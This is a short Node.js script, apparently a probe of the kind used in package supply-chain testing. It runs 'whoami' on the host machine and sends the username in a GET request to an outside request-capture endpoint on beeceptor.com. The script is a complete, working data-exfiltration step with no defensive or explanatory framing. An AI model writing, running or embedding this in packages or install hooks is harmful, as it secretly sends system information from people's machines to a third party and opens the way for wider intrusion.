const https = require('https');
const { execSync } = require('child_process');

async function run() {
    try {
        const user = execSync('whoami').toString().trim();
        const url = `https://erhantest-erhan.free.beeceptor.com?user=${encodeURIComponent(user)}`;

        console.log("Sending request...");

        await new Promise((resolve, reject) => {
            https.get(url, (res) => {
                console.log("Status Code:", res.statusCode);
                res.on('data', () => {}); 
                resolve();
            }).on('error', (err) => {
                console.error("Request Error:", err);
                reject(err);
            });
        });

        console.log("Request completed successfully!");
    } catch (e) {
        console.log("Catch Error:", e);
    }
}

run();